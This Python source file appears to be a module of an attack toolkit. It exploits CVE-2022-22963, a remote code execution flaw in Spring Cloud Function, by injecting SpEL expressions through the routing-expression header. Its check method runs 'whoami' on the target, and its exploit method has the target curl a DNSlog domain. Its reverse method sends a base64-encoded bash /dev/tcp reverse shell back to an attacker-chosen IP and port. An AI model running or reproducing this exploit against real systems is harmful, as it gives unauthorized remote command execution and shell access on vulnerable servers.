import random
import requests
# import toolss.utils
from toolss import dnsLog, utils
import os
from urllib.parse import urljoin
import base64

class CVE_2022_22963:
    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
    path = "functionRouter"

    def __init__(self,target, proxy) -> None:
        self.target =  target
        self.proxy = proxy
        self.headers = {
            'spring.cloud.function.routing-expression': self.payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': "1",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.verify = False
        self.timeout = 10
        self.allow_redirects = False

    def check(self):
        # info = dnsLog.dnslog_sessid()
        # print(info)
        # id = "123"
        # domain = f"{id}.{info["domain"]}"
        # ping随机域名，使DNSlog平台有记录
        # os.system('ping '+info["domain"]+' -n 2')

        # r = dnsLog.get_dnslog_rs(info)
        # print(r)

        result = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            # current_path = os.path.abspath(__file__) # 获取当前脚本文件的绝对路径
            # parent_path = os.path.dirname(current_path) # 获取当前脚本文件的上一层路径
            path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            filename = f"{path}\\file\\header.txt"
            ua = utils.read_file_slice(filename)
            self.headers["User-Agent"] = random.choice(ua)

            url = urljoin(self.target, self.path)
            data = "test"

            response = requests.post(url=url,headers=self.headers, timeout=self.timeout, verify=self.verify, data=data, proxies=self.proxy)
            if response.status_code == 500 and '"error":"Internal Server Error"' in response.text:
                result = f"[+] {self.target} 存在CVE-2022-22963 Spring Cloud Function SpEL 远程代码执行漏洞。\r\n[+] 该漏洞无回显,可以继续尝试进行反弹shell!"
            else:
                result = f"[-] {self.target} 不存在CVE-2022-22963"
            
            return result, err
        except Exception as e:
            err = f"[!] {self.target} 验证漏洞CVE-2022-22063发生了错误:{str(e)}"
            return result, err

    def exploit(self):
        info = dnsLog.dnslog_sessid()
        dns = info["domain"]
        command = f"curl {dns}"
        p = f'T(java.lang.Runtime).getRuntime().exec("{command}")'
        data = "test"
        result = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            filename = f"{path}\\file\\header.txt"
            ua = utils.read_file_slice(filename)
            self.headers["User-Agent"] = random.choice(ua)
            self.headers["spring.cloud.function.routing-expression"] = p
            url = urljoin(self.target, self.path)
            data = "test"
            response = requests.post(url=url,headers=self.headers, timeout=self.timeout, verify=self.verify, data=data, proxies=self.proxy)
            if response.status_code == 500 and '"error":"Internal Server Error"' in response.text:               
                b, d = dnsLog.get_dnslog_rs(info)
                if b:
                    result = f"[+] {self.target} 存在CVE-2022-22963 Spring Cloud Function SpEL 远程代码执行漏洞。\r\n[+] 该漏洞无回显，DNSLOG结果: {d}"
            else:
                result = f"[-] {self.target} 不存在CVE-2022-22963"
            
            return result, err
        except Exception as e:
            err = f"[!] {self.target} 验证漏洞CVE-2022-22063发生了错误:{str(e)}"
            return result, err
        

    def reverse(self, lip, lport):
        command = 'bash -i >&/dev/tcp/'+lip+'/'+lport+' 0>&1'
        command = command.encode("utf-8")
        command = str(base64.b64encode(command))
        command = command.strip('b')
        command = command.strip("'")
        command = 'bash -c {echo,' + command + '}|{base64,-d}|{bash,-i}'
        p = f'T(java.lang.Runtime).getRuntime().exec("{command}")'
        data = "test"
        result = ""
        err = ""
        try:
            requests.packages.urllib3.disable_warnings()
            path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            filename = f"{path}\\file\\header.txt"
            ua = utils.read_file_slice(filename)
            self.headers["User-Agent"] = random.choice(ua)
            self.headers["spring.cloud.function.routing-expression"] = p
            url = urljoin(self.target, self.path)
            data = "test"
            response = requests.post(url=url,headers=self.headers, timeout=self.timeout, verify=self.verify, data=data, proxies=self.proxy)
            if response.status_code == 500 and '"error":"Internal Server Error"' in response.text:               
                result = f"[+] {self.target} 存在CVE-2022-22963 Spring Cloud Function SpEL 远程代码执行漏洞。\r\n[+] 正在尝试反弹shell，请回主机{lip}查看结果"
            else:
                result = f"[-] {self.target} 不存在CVE-2022-22963"
            
            return result, err
        except Exception as e:
            err = f"[!] {self.target} 验证漏洞CVE-2022-22963发生了错误:{str(e)}"
            return result, err
